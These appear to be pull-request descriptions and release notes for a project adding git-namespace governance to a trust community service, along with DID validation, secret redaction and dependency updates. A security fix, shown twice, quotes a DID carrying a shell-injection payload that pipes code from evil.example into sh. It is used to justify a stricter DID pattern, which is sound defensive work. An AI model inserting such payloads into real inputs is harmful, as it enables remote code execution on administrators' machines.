title: feat(tui): Repos panel for community git namespaces (member side of git-ns) (#377)
body:
feat(tui): Repos panel for community git namespaces (member side of git-ns) (#377)

* chore(deps): trust-tasks-rs 0.22.3 with git-ns, and did-git-sign 0.4.14

The Repos panel speaks the git-ns/* Trust Task family, whose generated
types first ship in trust-tasks-rs 0.22.3 behind the non-default
`git-ns` feature. It is a patch move on the 0.22 line vta-sdk 0.51 is
already on, so nothing else follows it.

did-git-sign 0.4.14 publishes `init::commit_msg_hook_status` and
`COMMIT_MSG_HOOK_VERSION` (verifiable-git-infrastructure #72), which the
panel's signing-health row reads instead of re-implementing the hook's
version marker. It is on the same vta-sdk 0.51 line as 0.4.13, so the
graph still holds one vta-sdk.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* feat(core): a git-ns client for the member side of git namespaces

`openvtc_core::git_ns` sends the eight member-facing `git-ns/*` Trust
Tasks to a community's VTC — view, repo/create, right/grant,
right/revoke, repo/transfer, repo/archive, account/link and
account/link-status — and reads their answers.

Every payload is built through the generated
`trust_tasks_rs::specs::git_ns` types, so a value the schema refuses (an
unqualified resource, a DID without a method, an over-long reason) fails
before anything is sent, naming the field. Every document is addressed,
dated and signed by the persona: six of the tasks declare the proof
REQUIRED, and the two reads declare it RECOMMENDED; the VTC takes the
actor from the verified signer. Carriage is the DIDComm binding envelope,
as for the capability tasks.

Replies are parsed into typed responses keyed by thread. A response off
the schema is reported as a contract mismatch rather than dropped, and a
`trust-task-error` becomes a `Refusal` whose `explain()` gives each
declared code the fix it implies — `lastOwner` says to add another owner
first, `policyDenied` keeps the VTC's reason and points at the
community's policy, and the VTC's admin-only stand-in for step-up reads
as that rather than as a missing right. Framework codes are told apart
per R6.4.

Pure readings of a view back the TUI: the member's repositories with
their strongest right (implied rights included), where they may create,
the people on a repository, creation progress and drift.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* feat(tui): a Repos panel for a community's git repositories

`r` on an Active community opens it, mirroring the capabilities view:
every read and change is one signed `git-ns/*` task sent off the loop in
its own dispatch domain, the answer is matched by thread id on the
inbound channel, and after any change the view is read again.

- My repos: each repository the member holds a right on, the strongest
  right as a badge, and its status — ok, drift, checking, creating n/6,
  archived, orphaned.
- New repo, offered only with `repo.create`: namespace, name, visibility,
  description. A manual namespace or personal account says no bot can
  create there, and the steps the community answers with are shown on the
  repository.
- A repository: its creation steps while it is being made, its drift,
  and its people and rights. `a` adds a person — picked from the people
  the member can see, or a pasted DID for an outside contributor — with a
  right, an expiry and a reason; a `policyDenied` is shown in the form.
  `x` revokes, `t` transfers the member's ownership, `A` archives.
  Owner grants, transfers, archives and every removal are armed and sent
  only on `y`, labelled with their consent class.
- Forge account: `l` links a GitHub account (device code and URL) or a
  Forgejo one (URL and QR), polling `link-status` every five seconds until
  it settles or lapses.
- Commit signing: whether did-git-sign is set up for the persona, and
  whether the commit-msg hook is current, outdated ("re-run did-git-sign
  init"), someone else's, or missing — as did-git-sign's own
  `commit_msg_hook_status` reports it, off the loop thread.

One request awaits an answer at a time, so a refresh cannot take the
slot of a grant still in flight; replies have a 30 s window.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(repos): review follow-ups — sender checks, sanitising, link and signing health

- Every string the VTC supplies is sanitised before it is drawn or kept:
  DIDs and names, reasons, forge logins and ids, device codes, link URLs,
  manual steps, drift details, and a refusal's code and message. The
  sanitiser moves to `openvtc_core::display::sanitize_display` so core
  cleans a refusal's text the same way the TUI does.
- A git-ns reply is applied only when its transport sender and its
  document issuer are both the community the view is asking; a correctly
  threaded answer from anyone else is dropped.
- A link attempt is shown only once its `account/link` is actually sent;
  a refused send says why instead of leaving "starting…" forever.
  `account/link` gets a 60 s reply window (the VTC waits 30 s on its
  bridge first); everything else stays at 30 s.
- A link URL is shown, or drawn as a QR code, only if it is https on the
  link's own forge.
- Signing health checks both the hook for where openvtc was started (via
  did-git-sign's `commit_msg_hook_status`) and the global core.hooksPath,
  reports each with the file looked at, and leads with the worse. The
  install is looked for in the global config and the repository's
  `.did-git-sign.json`, so a repository-only install is not "not set up".
- Status lines carry an explicit severity; refusals, timeouts and link
  failures are drawn in the error colour.
- Only `y` confirms an armed change.
- After a timeout the form stays, marked "may have been applied —
  refresh"; a create answered after the member moved on does not
  navigate.
- My repos sorts strongest right first, then by name, as documented; the
  add-person hint names Ctrl+D.
- Tests: the schema-refusal test asserts the field; the signing test
  verifies the proof and its assertionMethod purpose.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

title: docs(vtc): step-up on a signed document is bound to the operation (#1641)
body:
A design note for the first of the two blockers #1641 names: the verbs gated on
a live passkey gesture — `acl/grant` and `acl/change-role` to admin, and
console-key enrolment — cannot move onto the signed door, because the step-up
is recorded on a session and a signed document has none.

Decided with the maintainer: the step-up a signed document needs is **bound to
the one operation** by payload digest and elevates nothing. The gate parks the
document and answers `stepUpRequired` with a challenge and a challenge-salted
wire digest; the admin answers with a user-verified passkey assertion
(`auth/step-up/approve-response`, `evidence.webauthn`, `boundTo`); the re-sent
document redeems that single-use mark (300 s). One gesture, one act, on every
transport. A console key can sign and redeem but never create a mark.

Not taken: reading the admin's live session (console-signing §6f, now marked
superseded). A document names no session, and a session elevation reached from
the signed door is the defect the VTA deleted as "delegated step-up" — one
approval admitting every act for fifteen minutes, which §6g's script would spend.

The note also covers VTI-APV-014, a separate gap on both doors: creating or
widening an unrestricted admin entry needs consent from another party, which
the VTC does not ask. It reuses the published `task-consent/*` ceremony, keyed
on the same payload digest as the step-up; the threshold is configurable per
community (default and minimum 1) and refused at write time when unmeetable.
The one-admin bootstrap edge is answered by an optional co-admin at install
and an offline break-glass.

Upstream first: VTI-APV-003 must admit operation-bound re-authentication, and
`approve-response` must allow a `boundTo` answer without a `sessionId`.

title: trust-tasks-rs-v0.22.6
body:
### Added

- **git-ns**: Hold every DID to the W3C DID Core syntax ([#629](https://github.com/trustoverip/dtgwg-trust-tasks-tf/pull/629))

The family's shared `Did` pattern, `^did:[a-z0-9]+:\S+$`, accepted
  anything without whitespace after the method: shell metacharacters,
  quotes, backticks, `/`, `?` and `#`. A security review found that
  `did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)` validated as a
  right's subject and later reached a copyable shell command in an admin
  UI.

  git-ns/_shared 0.3 narrows `Did` to a bare DID per DID Core 3.1:
  `did:`, a lowercase method name, and a method-specific id of
  colon-separated segments of `A-Z a-z 0-9 . - _` and percent-encoded
  octets, the last one non-empty. No path, query or fragment: every
  member typed `Did` names a party (subjects, owners, grantedBy, a
  transfer's `to`, a job's subjects), never a verification method. No
  other definition changes, and no DID-URL field in the family uses
  `Did`. The framework defines no DID pattern to reuse; issuer and
  recipient are unconstrained VIDs.

  Versioning. SPEC 6.6 item 1 requires a narrowed constraint in a shared
  schema component to be a new component version, so _shared/0.1 and
  0.2 are untouched. Item 3 couples adoption to a new version of each
  consuming specification, and the in-place rule of 5.2 covers only
  re-pins with no wire effect, so each latest spec version that carries
  a `Did` gets a new version. They are all draft, so the breaking
  narrowing ships as a MINOR increment under the draft allowance of 5.2:

    view 0.3, bridge/job 0.3, drift/resolve 0.2, namespace/reseat 0.2,
    repo/adopt 0.2, repo/archive 0.2, repo/create 0.2,
    repo/transfer 0.2, right/grant 0.2, right/revoke 0.2

  Each restates its predecessor with a "Changes from" section, pins
  _shared/0.3, and links to the newest versions of its siblings. The
  specs that carry no `Did` (account/*, bridge/event, bridge/result,
  namespace/bind, namespace/unbind) are unchanged.

  The six specs with a `Did` in the request gain invalid examples: shell
  metacharacters, whitespace, a `#` fragment and an uppercase method
  (and, for bridge/job, a bad `desiredRoles[].subject`).

  Bindings regenerated for Rust, TypeScript, Go and Dart. In TypeScript
  the hoisted `SharedComponents.Did`, `RepoSummary` and `RightRecord` now
  exist in two shapes and take family/version-qualified names
  (`Did_GitNsV0_1`, `Did_GitNsV0_3`, ...), as in #508; each spec module
  still exports them under their own names.

| `github.com/trustoverip/dtgwg-trust-tasks-tf/trust-tasks-go` | Go (tag `trust-tasks-go/v0.2.7`) | `0.2.6` → `0.2.7` | patch |
| `trust_tasks` | pub.dev | `0.2.6` → `0.2.7` | patch |

What merging does, per registry (all in `publish.yml`, each keyed on "this
version is not published yet"):

- **crates.io** — `release-plz-release` tags `<crate>-v<version>`, publishes in
  dependency order and creates a GitHub Release per crate. Bump levels come from
  `cargo-semver-checks`.
- **npm** — `publish-npm` publishes with OIDC provenance and tags
  `<prefix>-v<version>`.
- **Go** — `publish-go` builds, vets and tests, then pushes the tag, which *is*
  the publication. **Irreversible**: proxy.golang.org never forgets a tag.
- **pub.dev** — `tag-dart` verifies against the *published* core and pushes the
  tag; `publish-dart.yml` publishes from it.

The npm, Go and Dart bumps are only as accurate as the commit subjects — nothing
checks their APIs the way `cargo-semver-checks` checks the crates. Look for a
missing `!` before merging.

This branch is regenerated from `main` on every push, so do not commit to it —
edits are force-pushed away. See RELEASING.md.

title: feat(vtc-admin-ui): Repos plugin for git namespaces
body:
Follows #1694 (merged). The git-ns admin API, console-key delegation and the new `cnm git` verbs it adds are what this renders and drives.

## What

- **`git-ns/drift/resolve` 0.1.** An owner (or a namespace admin over the repository) answers one reported drift item.
  - **adopt** records the forge-side role as the `git-ns/right/grant` it is, under the same fixed rules, policy and consent class.
  - **revert** has the bridge undo the forge-side change and changes no right.
  - Items are selected by `type`, by `account` for role items, and by `observed`, which is required to adopt.
  - A resolution removes the item from `sync.drift` and queues an `inspect`.
  - Every declared code is implemented and tested: `driftNotFound`, `notAdoptable`, `accountNotLinked`, `noMatchingRight`, `notRevertible`, plus `unknownNamespace`, `namespaceNotBound`, `unknownRepo`, `repoNotActive`, `policyDenied`, `permissionDenied` and `malformedRequest`.
- **`git-ns/bridge/job` 0.2.** Sent only for reverting a `roleAdded` item (`projectRoles` with `removeAccounts`).
  - It is sent in-line, so a bridge that implements only 0.1 and refuses it is answered `notRevertible` rather than reported as done.
  - Every other job is still sent as 0.1.
- **`git-ns/namespace/reseat` 0.1.** A community administrator grants a permanent `git.ns.admin` to a current member on a headless namespace.
  - The headless check and the grant happen under one hold of the store lock.
  - `notHeadless` is refused without naming the live admins.
  - The audit record keeps the statement and how each earlier admin record ended, without a departed member's DID in plaintext.
- **`git-ns/view` 0.2**, served beside 0.1: `accounts` returns the caller's own linked forge accounts, narrowed to the forge of `resource` when one is given, and never another member's.
- **`git-ns/bridge/event` 0.2** (trust-tasks #627), served beside 0.1 by one handler, since the payloads are wire-identical.
  - A transfer detaches the repository wherever `to` is.
  - An event with any resource outside its namespace, drift items included, is refused before anything is applied. A transfer's `to` is exempt.
- **cnm:** `cnm git drift resolve …` and `cnm git reseat …`. `cnm git view` now asks for view 0.2. vtc-client gains the matching methods.
- **Default policy:** `namespace.reseat` counts as receiving a right, so the default admits only members; `drift.revert` is documented.

## Choices to review

- The projected right of a forge role is the inverse of VGI's default `RoleMap`:
  - `admin` maps to `own` and `maintain` to `maintain`.
  - On a personal account, `write` maps to `maintain`.
  - `write` on an organisation, `triage` and `read` project nothing. The VTC is not told whether committers are given `write`.
- Reverting an `admin` role has the impact of revoking `own` (elevated). Every other revert has the impact of revoking `maintain`. Under the default `elevated_requires_admin`, an owner therefore needs a community administrator to revert an `admin` role.

## Checks

The CI-equivalent run passes locally: workspace tests, vtc-service/vtc-client tests, `clippy -D warnings` and `fmt --check`.

title: feat(vtc-admin-ui): Repos plugin for git namespaces (#1696)
body:
feat(vtc-admin-ui): Repos plugin for git namespaces (#1696)

* feat(vtc-admin-ui): Repos plugin for git namespaces

The admin console's view of the git namespaces #1694 adds: namespace
cards (kind, bridge or manual mode, installation state, admins, repo
creators, the bridge's Dependabot service grant, the active git namespace
policy), each namespace's repositories with the four-dot VGI bootstrap
indicator and a lifecycle-then-sync status with the action it needs
(resolve drift, assign an owner, adopt), a repository page (people x
rights with granter, expiry, departed-granter and external-signer flags;
the bootstrap checklist; the guard design section 9 expects; the Trust
Registry records it publishes, implied commit rights included; drift;
recent activity), namespace rights, the issued-by-departed-members
review, and the bind flow.

Every git-ns change is a signed Trust Task authorized by the signer's own
git rights, the daemon mounts no bearer route for any of them, and the
console cannot sign a document yet (#1641). So each action is built
exactly as it will be sent and handed to the administrator as the
`cnm git` command that signs it, and as the document itself where cnm has
no command (transfer, archive). The dialog states the task's design
section 6 consent class and how this VTC enforces it
(`elevated_requires_admin`) rather than running a passkey step-up that
would elevate a session the signed document never uses.

Reads go through the eight `/v1/git-ns/*` admin routes under the
`git-ns/view/0.1` Trust-Task header, typed from the generated wire.ts.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* feat(vtc-admin-ui): Repos sends signed git-ns tasks, shows bridge-reported status

Follows #1694's second pass.

- Changes are signed with this browser's console key and sent to
  /v1/trust-tasks where one is enrolled (#1695); git-ns now resolves the
  key's delegation to the operator's admin DID (#1692) and authorizes by
  that DID's git rights. Where the browser cannot sign, the task is handed
  over as before. A refused signed task is shown as refused, never
  retried; a destructive one must be confirmed before it is signed.
- cnm commands for transfer and archive, and a New repo action built on
  `cnm git create` / git-ns/repo/create; a personal-account create shows
  the account holder's steps.
- Namespace cards show the bridge's forge status when reported: missing
  App permissions, a pending permission upgrade, no org rulesets, the
  installation and App name. Nothing is claimed when it is absent. The
  effective role_drift and cascade_on_departure are shown.
- The repository page shows the guard the bridge reports in force, and
  falls back to the design section 9 guard labelled as expected; plus
  per-step outcomes of the last create or bootstrap and the last check.
- Linked accounts come from GET /v1/git-ns/accounts and activity from
  GET /v1/git-ns/activity, replacing the derived versions.
- The console projections are read with no Trust-Task header, since only
  /v1/git-ns/view is gated on git-ns/view/0.1 now.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vtc-admin-ui): Repos matches the git-ns API as merged

- The registry preview mirrors `projection::desired_all`: a role-derived
  commit right inside a bound namespace is published by the git-ns
  projection, so it is listed there too.
- Rights, drift, the registry mirror, linked accounts and the departed
  review need a community administrator since #1694's review fixes; a 403
  on them now says so instead of showing the daemon's bare refusal.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vtc-admin-ui): keep git-ns document types out of the header census

trust_task_manifest pairs every Trust-Task URI literal in the console with
a route that enforces it. The git-ns task URIs are document types
dispatched by POST /v1/trust-tasks, with no route to bind them, and the
unused git-ns/view constant was a header no route binds as a literal.
Drop the constant and spell the document types from their family.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vtc-admin-ui): Repos review — quote every cnm argument, name the parties, honest reads

Review of #1696:

1. Every value in a `cnm git` command is shell-quoted (positionals) or
   bound to its flag as `--flag='value'`, so no DID, resource, id, name or
   free text can expand, split or be read as an option. didError follows
   DID Core syntax (method-name, idchar/pct-encoded segments, optional
   fragment). A table test runs every builder's command through `sh` with
   an injection payload and checks it arrives as one literal argument.
2. The signing dialog names the resource and every party (name and full
   DID) in its body; drift adoption shows the member a forge login
   resolves to by full DID.
3. Nothing is claimed from rights that are loading or unreadable (repo
   creators, the service grant, "nothing is published"); a 403 on the
   community-wide reads says a community administrator is needed.
4. Detached repositories (unbound namespace or moved out) are listed and
   shown as detached, not "never adopted"; namespaces get a destructive
   Unbind; the headless advice names git-ns/namespace/reseat
   (cnm git reseat) as coming, and unbind-and-rebind until then.
5. The expected guard respects forgeStatus.requiredWorkflow = false; an
   unrecognised reported guard is shown verbatim, not replaced.
6. Bind: only a successful send (or "I have sent it") starts watching;
   close, Escape and a refusal return to the form; "Back to the form"
   from the waiting step; next.url is called "continue on {forge}" only
   when its host is the forge.
7. SigningUnavailableError at send time has its own message and falls
   back to the terminal hand-over; expiry is 1..3650 whole days; reasons
   are at most 1024 characters; revoke takes an optional reason; the
   member picker pages at the listing's 200 limit with a filter.
8. trust_task_manifest gains a signed-document-type allowlist checked
   against git_ns::tasks::served_uris (now pub), replacing the join("/")
   spelling that dodged the header census.
9. Dialogs trap focus, return it to the opener, tie field errors with
   aria-describedby, and cannot be dismissed while a send is in flight.
10. Tests assert postSignedTrustTask is not called where nothing is sent,
    exactly once on a refusal; the vacuous departed-review check is gone.

title: feat(git-ns): hold every DID to the W3C DID Core syntax (#629)
body:
feat(git-ns): hold every DID to the W3C DID Core syntax (#629)

The family's shared `Did` pattern, `^did:[a-z0-9]+:\S+$`, accepted
anything without whitespace after the method: shell metacharacters,
quotes, backticks, `/`, `?` and `#`. A security review found that
`did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)` validated as a
right's subject and later reached a copyable shell command in an admin
UI.

git-ns/_shared 0.3 narrows `Did` to a bare DID per DID Core 3.1:
`did:`, a lowercase method name, and a method-specific id of
colon-separated segments of `A-Z a-z 0-9 . - _` and percent-encoded
octets, the last one non-empty. No path, query or fragment: every
member typed `Did` names a party (subjects, owners, grantedBy, a
transfer's `to`, a job's subjects), never a verification method. No
other definition changes, and no DID-URL field in the family uses
`Did`. The framework defines no DID pattern to reuse; issuer and
recipient are unconstrained VIDs.

Versioning. SPEC 6.6 item 1 requires a narrowed constraint in a shared
schema component to be a new component version, so _shared/0.1 and
0.2 are untouched. Item 3 couples adoption to a new version of each
consuming specification, and the in-place rule of 5.2 covers only
re-pins with no wire effect, so each latest spec version that carries
a `Did` gets a new version. They are all draft, so the breaking
narrowing ships as a MINOR increment under the draft allowance of 5.2:

  view 0.3, bridge/job 0.3, drift/resolve 0.2, namespace/reseat 0.2,
  repo/adopt 0.2, repo/archive 0.2, repo/create 0.2,
  repo/transfer 0.2, right/grant 0.2, right/revoke 0.2

Each restates its predecessor with a "Changes from" section, pins
_shared/0.3, and links to the newest versions of its siblings. The
specs that carry no `Did` (account/*, bridge/event, bridge/result,
namespace/bind, namespace/unbind) are unchanged.

The six specs with a `Did` in the request gain invalid examples: shell
metacharacters, whitespace, a `#` fragment and an uppercase method
(and, for bridge/job, a bad `desiredRoles[].subject`).

Bindings regenerated for Rust, TypeScript, Go and Dart. In TypeScript
the hoisted `SharedComponents.Did`, `RepoSummary` and `RightRecord` now
exist in two shapes and take family/version-qualified names
(`Did_GitNsV0_1`, `Did_GitNsV0_3`, ...), as in #508; each spec module
still exports them under their own names.

title: security(workspace): no type derives Debug over secret material
body:
A derived `Debug` prints every field, so on a type holding a private key, a
seed or mnemonic, a bearer or refresh token or a password it puts the secret
into anything that formats the value — a `tracing` field, an `unwrap` or
`expect` on an enclosing type, a test failure, a panic message. About 55 types
across twelve crates did exactly that. It surfaced when `vtc-client` began
holding an operator's key in a `HolderKey`, whose derived `Debug` printed it.

Each now has a hand-written `Debug` that reports the secret as `<redacted>` —
presence kept visible for an `Option` — and prints every other field as
before, the idiom the workspace already used where someone had thought of it.
Among them: `HolderKey`, `Session`, `ClientIdentity`, `CredentialBundle`,
`SecretEntry`, `AgentConfig`, `AgentConnect`, `AuthResult`, the key-import and
seed-rotation requests (mnemonic), `SeedRecord`, `MnemonicExportResponse`,
`SecretsConfig` (seed, Vault token, AppRole secret id), `VaultSecret`, its
`CustomField` values and secure notes, `TotpSeed`, the VTC install flow's
ephemeral signing keys, setup tokens and install JWT, the VTC backup's signing
bundle and password, mobile-core's X25519 and Ed25519 private keys, auth tokens
and push tokens (including the Web Push auth secret), and vta-mcp's
`--agent-key`/`--holder-key`/`--agent-secrets`.

`Zeroizing<T>` is not a redaction — its `Debug` prints the inner value — so the
fields wrapped in it were redacted too.

`vta-sdk/tests/secret_debug_census.rs` keeps the class closed. It parses every
workspace crate with `syn` and fails on a `#[derive(Debug)]` struct or enum
whose field has a secret-sounding name (`*_key`, `*token*`, `*secret*`,
`seed*`, `password`, `mnemonic`, `jwt`, and `secret_id` despite its `_id`)
and a raw type (`String`, bytes, `Zeroizing<_>`, optionally in an `Option` or
behind a reference). A field whose type is another workspace type inherits that
type's `Debug`, which is checked where it is defined. What the name rule
catches and is not a secret — a claim-type vocabulary token, a webvh path
called `mnemonic`, the name of an entry in a secret store — is on a
shrink-only list with what the field holds, and the census also refuses a
stale entry and a walk that has stopped finding types.

Not an API change: every type still implements `Debug`; only what it prints
differs, and no test asserted on the old output.

## Found beyond the census

The name rule is a net, not a proof. Review turned up secrets it cannot see by
name, and each is redacted by hand: `CustomField.value` (a vault's free-form
field, redacted whether or not it is marked `hidden`), the vault's
`secure_notes`, `PushRegistration::WebPush.auth` (the Web Push subscription
auth secret), `MintedInstallToken.jwt`, the refresh token riding
`AdminSessionRequest.ext`, and `agent_secrets` (inline `DidSecretsBundle` JSON)
in `AgentConnect` and vta-mcp. A reviewer adding a secret field under a
neutral name still has to redact it; the census catches the common names.

## Verified locally

- `cargo test --workspace --exclude vtc-service --exclude vtc-client --no-fail-fast`: all pass
- `cargo test -p vtc-service -p vtc-client --no-fail-fast`: all pass
- `cargo clippy --workspace --all-targets -- -D warnings`: clean, plus the three reduced-feature `vta-service` clippy runs
- `cargo fmt --all -- --check`: clean
- Census and `cargo check --workspace --all-targets` re-run after rebasing onto #1709 / #1710 / #1699

title: vta-service-v0.42.0
body:
### Fixed

- **vtc**: OpenAPI schema names are unique, so each endpoint documents its own shape ([#1697](https://github.com/OpenVTC/verifiable-trust-infrastructure/pull/1697)) ([#1701](https://github.com/OpenVTC/verifiable-trust-infrastructure/pull/1701))

utoipa keys `components.schemas` by bare type name, and
  `OpenApiRouter::routes` merges each route's schemas with a plain map
  `extend`, so two `ToSchema` types with one name fail nothing: the last
  registered wins and every `$ref` to the name describes that one. The VTC
  document had 18 such names across vtc-service and vta-sdk, and six were
  wrong in the published document — `GET /v1/admin/passkeys` was described
  as the console-key list, `/v1/auth/challenge` as the personhood challenge,
  and five revoke endpoints as the endorsement revoke response.

  - vtc-service: the service-side types get distinct names with
    `#[schema(as = …)]`. Rust type names are unchanged, so no handler moves
    and `openapi_response_census` still compares like with like.
  - vta-service: `RollbackResponse` and `EnrollPasskeyChallengeBody` were
    field-for-field copies of vta-sdk's types registered under the same
    names. The shapes matched, so the document happened to be right; the
    copies are deleted in favour of the vta-sdk types.
  - `openapi_schema_names.rs` in both services: a source-scan census that
    fails when two `ToSchema` definitions in the crate or its path
    dependencies share a schema name, and when the scan finds too few names
    to prove anything.
  - admin-ui: `openapi.json` and `wire.ts` regenerated; `PasskeyListResponse`
    restored as a generated alias and used by `myPasskeys.tsx` in place of
    the local interface that let the drift go unnoticed.



### Chore

- **deps**: Messaging-sdk 0.27.1 + trust-tasks-rs 0.22.3; answer a mutual TSP cancel the SDK could not (Keyring VTI-38) ([#1693](https://github.com/OpenVTC/verifiable-trust-infrastructure/pull/1693))

Raises the floors on top of #1690's 0.22.1 / 0.27.0 move: trust-tasks-rs and
  -proof to 0.22.3 (the git-ns family, enabled by all-specs; the rest of the
  trust-tasks-* line resolves to 0.22.3 too), affinidi-messaging-sdk to 0.27.1.
  The graph holds exactly one copy of each.

  `affinidi-messaging-sdk` becomes a workspace dependency (floor 0.27.1) in
  place of five hand-kept per-crate literals.

  SDK 0.27.1 answers a peer's §7.3 cancellation of a mutual relationship
  itself, and `reply_expected` now means "the answer is still owed", which is
  true only when that send failed. The VTA's and VTC's `handle_tsp_control`
  retried with `cancel_relationship`, which refuses `SendCancel` out of `None`
  (the relationship is already forgotten). That is the exact VTI-38 failure.
  They now use `TspOps::answer_cancellation`.

title: pnm-cli-v0.23.1
body:
### Added

- **pnm**: Show the VTA's DID as a QR code with `pnm vta qr` ([#1700](https://github.com/OpenVTC/verifiable-trust-infrastructure/pull/1700))

`pnm vta qr` prints the active VTA's DID as a terminal QR code, for a
  phone (Keyring) to scan instead of retyping it. It runs offline: the DID
  comes from this machine's config, `--vta` picks which VTA, `--did <DID>`
  draws any other DID, and `--out <file.svg>` also writes the code as an SVG.

  The code carries the bare DID and nothing else, the same choice as the VTC
  landing page's `/v1/community/did-qr.svg` ([#1698](https://github.com/OpenVTC/verifiable-trust-infrastructure/pull/1698)). A DID is already a URI
  (scheme `did`), so no `did://` or app-specific wrapper is added.

  The terminal code is drawn with half blocks and paints its own colours,
  black modules on a white ground, on every line. The terminal's default
  colours would draw it inverted on a dark theme, and many phone cameras
  refuse an inverted code. The four-module quiet zone is part of the output.

  The renderer lives in `vta_cli_common::qr` (`terminal_lines`, `svg`) so
  `cnm` can use it too. A test unpacks the half blocks back into a module
  grid and checks it against the encoder's, module by module. `qrcode` is
  added with the `svg` feature only.



### Fixed

- **pnm**: Log output no longer draws over `pnm messaging console` ([#1707](https://github.com/OpenVTC/verifiable-trust-infrastructure/pull/1707))

* fix(pnm): log output no longer draws over `pnm messaging console`

  pnm's tracing subscriber wrote to stderr, which is the terminal the console
  draws on. Anything logged while it ran, such as the SDK's repeated errors
  while a mediator is unreachable, landed on top of the screen and stayed
  there. The subscriber now writes through the console's `LogCapture`, which
  is stderr as before except while the console runs. Then the lines are kept
  for its log view (`l`).

  Needs affinidi-messaging-mediator-tui 0.2.1.

  true only when that send failed. The VTA's and VTC's `handle_tsp_control`
  retried with `cancel_relationship`, which refuses `SendCancel` out of `None`
  (the relationship is already forgotten). That is the exact VTI-38 failure.

title: build(pnm): the console's monitor resubscribes after an interruption
body:
Takes `affinidi-messaging-mediator-tui` 0.2.2 and `affinidi-messaging-mediator-admin` 0.2.1, from affinidi/affinidi-tdk-rs#892. The change is lockfile only: pnm's requirement (`"0.2.1"`) already allows these versions, but release builds use the lockfile.

## What pnm users get

In `pnm messaging console`, the traffic monitor used to stop for good in two cases, until you pressed `m` twice:
- a lease renewal failed during a network drop
- the mediator restarted and silently forgot the subscription

Now:
- A renewal that fails because of the connection is retried while the lease is still running.
- A feed that ends, or goes 90 s without even a heartbeat, is resubscribed, waiting 2 s and doubling up to 30 s between attempts.
- The pane title shows `↻ resubscribing in Ns` in the meantime.
- Only a refused subscribe stops it, and the pane says why.

## Lockfile

The diff is only these two crates. A plain `cargo update -p …` also moved `pgp` and `serde-saphyr` from `base64` 0.22.1 to 0.21.7. Both crates accept either version, so that was resolver churn, not something this update needs. I put those two lines back, and `cargo metadata --locked` accepts the lockfile unchanged.

## Testing

`cargo clippy --locked -p pnm-cli --all-targets -D warnings` is clean, and `cargo test --locked -p pnm-cli` passes (98 tests).

title: feat(vtc): git namespaces — forge governance, registry projection and bridge messaging
body:
> **Draft.** Builds on #1693 (trust-tasks-rs 0.22.3 with `git-ns`, now on `main`). Two commits: the git-namespace implementation, then the admin-console follow-ups (console-key delegation, bridge status, accounts/activity reads, more `cnm git` verbs).

## What

The VTC side of **VTC Git Namespaces**: a community governs repositories on the forges it has bound — who may create them, who owns each, whose commits its CI check accepts — and publishes those rights to its Trust Registry. Implements the `git-ns/*` Trust Task family (trustoverip/dtgwg-trust-tasks-tf `specs/git-ns/**`, plus #623: an `ns.admin`'s implied `git.commit.sign` is published on the namespace resource) against the design in `design-docs/vtc-git-namespaces-design.md` (§4, §5.1–5.5, §6, §9). Where they differ, the specification is followed.

### vtc-service `git_ns` module
- **Store** (`git_ns`, `git_ns_jobs`, `git_ns_projection` keyspaces; `git_ns` backed up, the other two excluded as re-derivable). Namespaces, repositories keyed by an internal id (forge id recorded once known, so a rename moves rights and a new repo at the old name inherits nothing), per-scope rights sets (one row per namespace/repository so a transfer is one write), link attempts. Forge accounts on `Member.extensions.forges[host]`. All mutations serialised under one process-wide lock (last-owner/last-admin are set invariants).
- **Fixed rules in code** (`git_ns::rules`, pure, table-tested): whole-segment containment (reuses `vta_sdk::context_path::is_ancestor_or_self`; a right never crosses forges), level check, the grant-authority table incl. `repo.create` not re-delegable, implied authority, `permissionDenied` vs `scopeViolation` vs `escalation`, last owner, last admin, members-only floor.
- **Policy**: `PolicyPurpose::GitNamespace` (`gitNamespace`, package `vtc.git_namespace`), default `policies/default/git_ns.rego` — members only, no external signers. Evaluated after the fixed rules through a `VerifiedGitNsFacts` gate; can only refuse (`git-ns:policyDenied`). Also answers `settings` (`maintainer_grants_commit`, `cascade_on_departure`, `role_drift`).
- **Tasks** (proof-required per spec, on the document dispatcher via an `AsyncDispatcher` like `rooms/*`): bind, unbind, repo create/adopt/transfer/archive, right grant/revoke, view, account link/link-status, bridge result/event. Every declared error code is emitted.
- **Consent classes** (design §6): the VTC has no member step-up on a signed document, so `[git_ns] elevated_requires_admin` (default true) admits elevated/destructive actions only from a community administrator, in addition to the rights model. Narrows only.
- **Registry projection**: audit-log-tailed projector writing `registry/record/{put,delete}` (new `TrustRegistryClient::{put,delete}_trust_record`), tuple `{subject, authority = VTC DID, action = right, resource}`, implied `git.commit.sign` for own/maintain on the repo and ns.admin on the namespace; `context` carries framework (VTI-REG-002), grantedBy, activeFrom/activeTo; reason never published. Mirror-based, idempotent, rebuildable; deletes before puts, and a repo with an outstanding delete gets no new tuples (rename safety).
- **Lifecycle**: departure (detected from `subject_was_member`, robust to RTBF-nulled audit plaintext) revokes all git rights, orphans sole-owner repos, keeps and lists grants issued by departed members (or revokes them under `cascade_on_departure`), deletes forge links; expiry sweep; stale pending binds expire.
- **v0.1 `[hooks.git-trust] grant_on_role`** unchanged; listed as `roleDerived` on the admin surface.

### Bridge messaging
`git-ns/bridge/job` signed and sent over TSP/DIDComm by service-type selection (REST refused as no matching protocol), ack correlated through `PendingReplies`; durable queue with retry (projectRoles forever, others bounded), superseding, re-send when a result never comes. `begin*` jobs in-line. Results and events accepted only from the namespace's recorded bridge DID; events handled per spec (rename/transfer/unmanaged/deleted/role/protection/installationRemoved/accountLinked/bindCompleted) and drift replaced per repository. Role projection recomputes the full desired set per target and sends on change. When a bridge-mode namespace becomes bound, the bridge DID receives `git.commit.sign` on the namespace as a **service grant** (`grantedBy` = the VTC's DID) so Dependabot PRs it re-signs pass the check; the default policy admits exactly that grant for the namespace's own bridge and nothing else for non-members; unbind revokes it.

### REST (admin, read-only; `view` gated on `Trust-Task: git-ns/view/0.1`)
